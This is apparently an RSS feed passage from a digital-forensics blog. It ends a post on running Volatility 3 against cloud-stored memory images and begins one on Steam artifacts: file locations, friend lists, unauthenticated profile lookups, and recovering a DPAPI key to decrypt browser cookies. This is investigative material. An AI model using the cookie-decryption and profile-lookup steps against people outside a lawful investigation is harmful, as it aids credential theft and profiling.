d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="google-cloud-bucket">Google cloud bucket<a href="https://forensicxlab.github.io/blog/vols3#google-cloud-bucket" class="hash-link" aria-label="Direct link to Google cloud bucket" title="Direct link to Google cloud bucket">‚Äã</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">GOOGLE_PROJECT_ID</span><span class="token operator">=</span><span class="token plain">REDACTED</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">~¬ª </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">export</span><span class="token plain"> </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">GOOGLE_APPLICATION_CREDENTIALS</span><span class="token operator">=</span><span class="token plain">/</span><span class="token environment constant" style="color:rgb(189, 147, 249)">PATH</span><span class="token plain">/gcreds.json</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">~ ¬ª vol </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-gs</span><span class="token plain"> </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-f</span><span class="token plain"> gs://volweb/Snapshot6.vmem windows.dlllist</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Volatility </span><span class="token number">3</span><span class="token plain"> Framework </span><span class="token number">2.4</span><span class="token plain">.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Progress:  </span><span class="token number">100.00</span><span class="token plain">		PDB scanning finished</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">PID	Process	Base	Size	Name	Path	LoadTime	File output</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">244</span><span class="token plain">	smss.exe	0x48080000	0x20000	smss.exe	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">SystemRoot</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">System32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">smss.exe	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">244</span><span class="token plain">	smss.exe	0x777e0000	0x1a9000	ntdll.dll	C:</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">SYSTEM32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ntdll.dll	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">332</span><span class="token plain">	csrss.exe	0x49b80000	0x6000	csrss.exe	C:</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">system32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">csrss.exe	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token number">332</span><span class="token plain">	csrss.exe	0x777e0000	0x1a9000	ntdll.dll	C:</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">SYSTEM32</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">ntdll.dll	N/A	Disabled</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">..</span><span class="token plain">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="applications">Applications<a href="https://forensicxlab.github.io/blog/vols3#applications" class="hash-link" aria-label="Direct link to Applications" title="Direct link to Applications">‚Äã</a></h2>
<p>One can ask what are the potential applications after these new additions to the framework.</p>
<ul>
<li>
<p>Remote investigation: Memory forensics can be performed on object storage without requiring physical access to the device hosting the storage. This allows for remote investigations, making it more convenient and efficient.</p>
</li>
<li>
<p>Scalability: Object storage over the network offers scalability, allowing the storage capacity to be expanded easily when dealing with large data volumes. This is particularly useful when performing memory forensics on extensive datasets.</p>
</li>
<li>
<p>Improved Collaboration: By conducting memory forensics on object storage accessible over the network, multiple IT specialists and forensic experts can collaborate on the investigation simultaneously. This promotes knowledge sharing and enhances the chances of identifying critical evidence.</p>
</li>
<li>
<p>Memory Acquisition at scale : One can script memory acquisition and deploy evidence collection on multiple system by storing the result into an On-Premise solution like Minio or in a cloud solution like AWS.</p>
</li>
<li>
<p>No third party installation : Some people don't like to have "agent-base" solutions installed on their assets to perform memory forensics. Once the evidence are acquired, memory forensics will be performed on a dedicated environment.</p>
</li>
</ul>
<div style="background-color:white;align-items:center"><p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/3-c0b447818172958593d7d702d9eaa902.png" title="Arch 3" width="3845" height="2592" class="img_ev3q"></p></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://forensicxlab.github.io/blog/vols3#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">‚Äã</a></h2>
<p>To conclude, the goal of this addition to the volatility3 framework is to give more capabilities to digital investigators and incident responders when performing memory forensics. The fork of the project implementing this feature is available for you to review the code : <a href="https://github.com/forensicxlab/volatility3/tree/feature/bucket-s3" target="_blank" rel="noopener noreferrer">https://github.com/forensicxlab/volatility3/tree/feature/bucket-s3</a> .</p>
<p>Like all solutions, there are downsides to remote memory forensics. Indeed performing remote memory forensics will have an impact on performances and the investigator need to choose wisely about the solution used. However with cloud-computing network performances, network memory forensics can be very efficient. In a futur blogpost, a concrete application of remote memory forensics will be demonstrated by introducing VolWeb 2.0 which is still in development at the time of writing of this article.</p>
<blockquote>
<p>Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a> to enhance this article or to comment on the integration to the volatility framework.</p>
</blockquote>
<!-- -->
<section data-footnotes="true" class="footnotes"><h2 class="anchor anchorWithStickyNavbar_LWe7 sr-only" id="footnote-label">Footnotes<a href="https://forensicxlab.github.io/blog/vols3#footnote-label" class="hash-link" aria-label="Direct link to Footnotes" title="Direct link to Footnotes">‚Äã</a></h2>
<ol>
<li id="user-content-fn-1-a3ad40">
<p><a href="https://volatility3.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener noreferrer">https://volatility3.readthedocs.io/en/latest/index.html</a> <a href="https://forensicxlab.github.io/blog/vols3#user-content-fnref-1-a3ad40" data-footnote-backref="" aria-label="Back to reference 1" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-2-a3ad40">
<p><a href="https://github.com/fsspec/s3fs/" target="_blank" rel="noopener noreferrer">https://github.com/fsspec/s3fs/</a> <a href="https://forensicxlab.github.io/blog/vols3#user-content-fnref-2-a3ad40" data-footnote-backref="" aria-label="Back to reference 2" class="data-footnote-backref">‚Ü©</a></p>
</li>
<li id="user-content-fn-3-a3ad40">
<p><a href="https://gcsfs.readthedocs.io/en/latest/#" target="_blank" rel="noopener noreferrer">https://gcsfs.readthedocs.io/en/latest/#</a> <a href="https://forensicxlab.github.io/blog/vols3#user-content-fnref-3-a3ad40" data-footnote-backref="" aria-label="Back to reference 3" class="data-footnote-backref">‚Ü©</a></p>
</li>
</ol>
</section>]]></content:encoded>
            <category>DFIR</category>
            <category>Volatility</category>
            <category>Memory Forensics</category>
        </item>
        <item>
            <title><![CDATA[üî¶ Video Games Forensics - Steam]]></title>
            <link>https://forensicxlab.github.io/blog/steam</link>
            <guid>https://forensicxlab.github.io/blog/steam</guid>
            <pubDate>Wed, 05 Jul 2023 00:00:00 GMT</pubDate>
            <description><![CDATA[Video games have become an integral part of our culture, providing entertainment and social opportunities. Unfortunately, criminals have also begun to take advantage of modern video games and their ever-growing capabilities to conduct illegal activities. Organized crime, hate spread, and pedophilia have been documented occurring within games, opening up the potential to a world of cybercrime.]]></description>
            <content:encoded><![CDATA[<p>Video games have become an integral part of our culture, providing entertainment and social opportunities. Unfortunately, criminals have also begun to take advantage of modern video games and their ever-growing capabilities to conduct illegal activities. Organized crime, hate spread, and pedophilia have been documented occurring within games, opening up the potential to a world of cybercrime.</p>
<p>Digital forensics on the Steam application can be especially useful for law enforcement in tracking down and prosecuting these cybercriminals. By investigating video game applications like Steam, digital footprints that can be used to link individuals to games, transactions, and even other players. Once these links are established, they can then used to build a case against the perpetrators. In this article, the reader will learn about some artifacts that can give releavant information left on a disk during a post-mortem analysis.</p>
<blockquote>
<p><strong>Note :</strong> All of the information about the investigated user displayed in the following findings are redacted.</p>
</blockquote>
<p>A dedicated web browser is built into the Steam software (the Steam application is just another derived version of chromium). It can even be accessed while playing in game. It is a convinient way for gamers to look for something online without quitting the game. Therefore, interesting artifacts can be retrieved in the same way a digital forensics investigator would do when performing a Chrome analysis.</p>
<p>Locations:</p>
<ul>
<li>Windows 10 : <code>%UserProfile%\AppData\Local\Steam\htmlcache\</code></li>
<li>Ubuntu : <code>$HOME/.local/share/Steam/config/htmlcache/</code></li>
<li>MacOS : <code>$HOME/Library/Application Support/Steam/config/htmlcache/</code></li>
</ul>
<p>By using opensource investigation tools like Hindsight <sup><a href="https://forensicxlab.github.io/blog/steam#user-content-fn-1-ffd9e8" id="user-content-fnref-1-ffd9e8" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup>, one can extract browser Cookies (and decrypt them), Cache, Session Storage, Local Storage, History, Visited Links, etc...</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/steam_1-d5e774bf4197e16ad2ebfddcdeabd52e.png" title="HindSight" width="1187" height="383" class="img_ev3q"></p>
<blockquote>
<p>On Windows, a base64 encoded DPAPI key can be recovered in the following path : <code>%UserProfile%\AppData\Local\Steam\htmlcache\LocalProfs.json</code></p>
</blockquote>
<blockquote>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/3-44d51b8275a6a17c2a549ee3927113af.png" title="DPAPI" width="917" height="128" class="img_ev3q"> DPAPI encryption is based upon user password, therefore one may be able to retrive the cleartext value of encrypted cookies. Learn more about DPAPI here : <a href="https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28#32" target="_blank" rel="noopener noreferrer">https://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28#32</a></p>
</blockquote>
<h1>Miscellaneous: Friends, Installed games, Playtime and game sessions</h1>
<p>As a digital forensics investigator, you might be interested about the Steam friends of the user you are investigating, the games he played and for how long.
All of the Steam users and games have unique IDs used to talk to the servers and get various information.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="steam-user-account-information">Steam user account information<a href="https://forensicxlab.github.io/blog/steam#steam-user-account-information" class="hash-link" aria-label="Direct link to Steam user account information" title="Direct link to Steam user account information">‚Äã</a></h2>
<p>The user has two assigned unique IDs :</p>
<ul>
<li>The Steam ID : Used to identify a profile on the Steam community website.</li>
<li>The account ID : Used to link the account to other various information (subscription, owned games,...)</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="recovering-the-users-steam-id">Recovering the user's Steam id<a href="https://forensicxlab.github.io/blog/steam#recovering-the-users-steam-id" class="hash-link" aria-label="Direct link to Recovering the user's Steam id" title="Direct link to Recovering the user's Steam id">‚Äã</a></h3>
<p>Locations:</p>
<ul>
<li>Windows 10: <code>%programfiles(x86)%\Steam\config\loginusers.vdf</code></li>
<li>Ubuntu: <code>$HOME/.local/share/Steam/config/loginusers.vdf</code></li>
<li>MacOS: <code>$HOME/Library/Application Support/Steam/config/loginusers.vdf</code></li>
</ul>
<blockquote>
<p><strong>Note :</strong> The VDF file format is the Valve's KeyValue text file format. It is similar to the json file format.</p>
</blockquote>
<p>Content:</p>
<div class="language-JSON language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">"users"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token string" style="color:rgb(255, 121, 198)">"76561199524123422232"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"AccountName"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"Jean"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"PersonaName"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"superjean"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"RememberPassword"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"1"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"WantsOfflineMode"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"0"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"SkipOfflineModeWarning"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"0"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"AllowAutoLogin"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"1"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"MostRecent"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"1"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"Timestamp"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"1688740727"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Using the Steam ID, one can retrive more information about the community profile by browsing to <code>https://steamcommunity.com/actions/ajaxresolveusers?steamids=[STEAM_ID]</code>.</p>
<p>JSON result:</p>
<div class="language-JSON language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">"steamid"</span><span class="token operator">:</span><span class="token string" style="color:rgb(255, 121, 198)">"765231213229864"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">"accountid"</span><span class="token operator">:</span><span class="token number">15623422136</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">"persona_name"</span><span class="token operator">:</span><span class="token string" style="color:rgb(255, 121, 198)">"superjean"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">"avatar_url"</span><span class="token operator">:</span><span class="token string" style="color:rgb(255, 121, 198)">"0000000000000000000000000000000000000000"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">"profile_url"</span><span class="token operator">:</span><span class="token string" style="color:rgb(255, 121, 198)">""</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">"persona_state"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">"city"</span><span class="token operator">:</span><span class="token string" style="color:rgb(255, 121, 198)">"Athabasca"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">"state"</span><span class="token operator">:</span><span class="token string" style="color:rgb(255, 121, 198)">"Alberta"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">"country"</span><span class="token operator">:</span><span class="token string" style="color:rgb(255, 121, 198)">"CA"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">"real_name"</span><span class="token operator">:</span><span class="token string" style="color:rgb(255, 121, 198)">"Jean Pierre"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">"is_friend"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token property">"friends_in_common"</span><span class="token operator">:</span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p><strong>Note :</strong> there is no need to be authenticated to Steam to retrive those data.</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="friends">Friends<a href="https://forensicxlab.github.io/blog/steam#friends" class="hash-link" aria-label="Direct link to Friends" title="Direct link to Friends">‚Äã</a></h2>
<p>Locations:</p>
<ul>
<li>Windows 10 : <code>%programfiles(x86)%\Steam\userdata\[account ID]\config\localconfig.vdf</code></li>
<li>Ubuntu : <code>$HOME/.local/share/Steam/userdata/[account ID]/config/localconfig.vdf</code></li>
<li>MacOS : <code>$HOME/Library/Application Support/Steam/userdata/[account ID]/config/localconfig.vdf</code></li>
</ul>
<p>The user's friend list can be found at the begining of the file under the "friends" section.</p>
<div class="language-JSON language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">...</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token string" style="color:rgb(255, 121, 198)">"friends"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">	</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"1232434343"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token string" style="color:rgb(255, 121, 198)">"NameHistory"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">				</span><span class="token string" style="color:rgb(255, 121, 198)">"0"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"superjean"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token string" style="color:rgb(255, 121, 198)">"avatar"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"8376ba022787d9a86309b7b2b68e9994056c06e7"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token string" style="color:rgb(255, 121, 198)">"name"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"superjean"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"PersonaName"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"superjean"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"communitypreferences"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"1800280130013800"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"11132322"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token string" style="color:rgb(255, 121, 198)">"name"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"Pierre"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token string" style="color:rgb(255, 121, 198)">"NameHistory"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">				</span><span class="token string" style="color:rgb(255, 121, 198)">"0"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"Pierre"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">			</span><span class="token string" style="color:rgb(255, 121, 198)">"avatar"</span><span class="token plain">		</span><span class="token string" style="color:rgb(255, 121, 198)">"9f0c155db20221ade1ca5e1de4a705049f540bac"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">		</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">...</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The first ID is always the account ID of the user you are investigating (the user is friend with himself). Next, all of his friends are listed alongside with their ID.</p>
<p>To recover more information about the user's friend one may use the following request :</p>
<p><a href="https://steam-chat.com/miniprofile/ACCOUNT_ID/json/" target="_blank" rel="noopener noreferrer">https://steam-chat.com/miniprofile/ACCOUNT_ID/json/</a></p>
<p>This request has to be made online; it is usefull to see if the user changed his informations when performing the post-mortem analysis.</p>
<p>With this, the investigator will be able to confirm :</p>
<ul>
<li>The user's friend name (may have changed  when performing the post-mortem analysis)</li>
<li>Retrive the profile picture (can be great to build a graph).</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="owned-and-installed-games">Owned and Installed games<a href="https://forensicxlab.github.io/blog/steam#owned-and-installed-games" class="hash-link" aria-label="Direct link to Owned and Installed games" title="Direct link to Owned and Installed games">‚Äã</a></h2>
<p>Inside <code>localconf.vdf</code> it is also indicated the games owned by the user, the last play time and how much time he spend on each game:</p>
